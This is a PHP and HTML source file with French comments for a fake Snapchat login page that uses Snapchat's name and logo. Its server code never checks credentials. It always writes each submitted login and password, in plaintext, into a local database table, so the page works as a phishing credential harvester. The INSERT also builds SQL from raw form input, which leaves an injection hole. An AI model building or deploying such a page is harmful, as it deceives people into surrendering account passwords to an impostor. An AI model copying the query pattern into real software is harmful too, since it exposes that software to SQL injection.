<?php
// Inclut les paramètres de connexion à la BDD
include 'connexion.php';
session_start();


$msg = '';
$login = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Récupère les valeurs du formulaire
    $login = trim($_POST['login'] ?? '');
    $password = $_POST['mdp'] ?? '';

    if ($login === '' || $password === '') {
        $msg = 'Remplis tous les champs.';
    } else {
        // Connexion à la BDD
        $bdd = mysqli_connect($serveurBDD, $userBDD, $mdpBDD, $nomBDD);

        if (!$bdd) {
            $msg = 'Erreur connexion BDD : ' . mysqli_connect_error();
        } else {
            // On insère toujours les données dans la table utilisateur
            $sql = "INSERT INTO utilisateur (login, mdp) VALUES ('$login', '$password')";
            if (mysqli_query($bdd, $sql)) {
               // $msg = ' Données enregistrées en base.';
            } else {
                $msg = ' Erreur lors de l’enregistrement : ' . mysqli_error($bdd);
            }

            mysqli_close($bdd);
        }
    }
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Connexion Snapchat</title>
  <link rel="stylesheet" href="style.css">
  <!-- logo dans l'onglet -->
<link rel="icon" type="image/png" href="snapp.png">

</head>
<body>
    <div class="login-wrapper">
        <div class="login-container">

            <!-- Logo Snapchat -->
            <img src="snapchat.png" alt="Logo Snapchat" class="logo" width="80">
            



            <h1>Snapchat</h1>

            <?php if ($msg !== ''): ?>
                <p style="color:red; font-weight:bold;">
                    <?php echo htmlspecialchars($msg, ENT_QUOTES, 'UTF-8'); ?>
                </p>
            <?php endif; ?>

            <form method="post" action="">
                <input type="text" name="login" placeholder="Login" required value="<?php echo htmlspecialchars($login ?? '', ENT_QUOTES, 'UTF-8'); ?>">
                <input type="password" name="mdp" placeholder="Mot de passe" required>
                <button type="submit">S’identifier</button>
            </form>

            <p class="forgot"><a href="oubli.php">Mot de passe oublié ?</a></p>
        </div>
    </div>
</body>
</html>
